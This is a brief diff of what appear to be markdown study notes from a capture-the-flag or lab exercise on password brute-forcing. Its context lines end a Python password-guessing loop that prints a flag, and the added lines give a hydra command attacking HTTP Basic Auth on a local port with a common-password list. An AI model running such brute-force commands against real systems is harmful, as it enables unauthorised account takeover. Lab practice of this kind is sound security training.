@@ -221,3 +221,7 @@ for password in passwords:
         print(f"Flag: {response.json()['flag']}")
         break
 ```
+
+#### Bruteforcing Basic HTTP Auth:
+```hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81```
+#### Bruteforcing Login Forms:
